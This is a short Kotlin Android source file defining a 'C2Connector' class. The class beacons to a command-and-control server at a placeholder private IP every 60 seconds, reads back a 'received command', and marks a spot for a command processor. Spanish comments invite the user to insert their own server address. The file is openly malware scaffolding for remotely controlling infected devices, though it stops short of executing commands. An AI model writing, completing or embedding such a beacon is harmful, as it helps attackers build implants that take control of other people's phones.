package com.phantom.os.network

import android.content.Context
import android.util.Log
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

class C2Connector(private val context: Context) {

    companion object {
        const val TAG = "C2Connector"
        // IP de ejemplo (cámbiala por la de tu servidor)
        private const val SERVER_URL = "http://192.168.1.100:8080/checkin" 
    }

    fun startListening() {
        Log.d(TAG, "📡 Inicializando conexión nativa...")
        checkIn()
    }

    private fun checkIn() {
        Thread {
            try {
                val url = URL(SERVER_URL)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.connectTimeout = 5000
                connection.readTimeout = 5000

                val responseCode = connection.responseCode
                
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    val reader = BufferedReader(InputStreamReader(connection.inputStream))
                    val response = reader.readText()
                    Log.d(TAG, "✅ Comando recibido: $response")
                    // Aquí llamarías a tu procesador de comandos
                } else {
                    Log.e(TAG, "❌ Error de conexión: $responseCode")
                }
                
                connection.disconnect()
                
                // Reintentar en 60 segundos
                Thread.sleep(60000)
                checkIn()
                
            } catch (e: Exception) {
                Log.e(TAG, "❌ Excepción en C2", e)
                Thread.sleep(30000) // Espera más si hay error
                checkIn()
            }
        }.start()
    }

    fun stopListening() {
        Log.d(TAG, "🔌 Conexión detenida")
    }
}
